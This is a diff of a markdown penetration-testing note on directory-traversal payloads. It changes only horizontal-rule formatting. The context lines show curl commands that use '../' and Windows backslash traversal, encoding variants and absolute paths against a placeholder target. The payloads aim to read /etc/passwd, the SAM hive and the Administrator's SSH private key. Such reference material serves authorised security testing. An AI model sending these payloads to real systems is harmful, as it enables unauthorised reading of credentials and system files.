@@ -16,7 +16,7 @@ linked:
 ---
 # Directory Traversal - Payloads Básicos
 
-***
+---
 
 ## Unix `../` Traversal
 
@@ -39,7 +39,7 @@ linked:
 | `curl --data-urlencode "file=../../etc/passwd" -G https://target/` | curl helper URL-encode payload | Encode helper. |
 ^pt-payload-unix
 
-___
+---
 
 ## Windows `..\\` Traversal
 
@@ -63,7 +63,7 @@ ___
 | `curl 'https://target/?file=..\windows\system32\config\SAM'` | SAM hashes (locked while running) | Locked-but-possible. |
 ^pt-payload-windows
 
-___
+---
 
 ## Mixed Encoding
 
@@ -86,7 +86,7 @@ ___
 | `curl --data-urlencode "file=../+../etc/passwd" -G https://target/` | Plus-encoded space (URL form) | URL form-encode. |
 ^pt-payload-mixed
 
-___
+---
 
 ## Absolute Paths
 
@@ -122,4 +122,4 @@ ___
 | `curl 'https://target/?file=C:\Users\Administrator\.ssh\id_rsa'` | Windows admin SSH key | Win privesc. |
 ^pt-payload-absolute
 
-***
+---
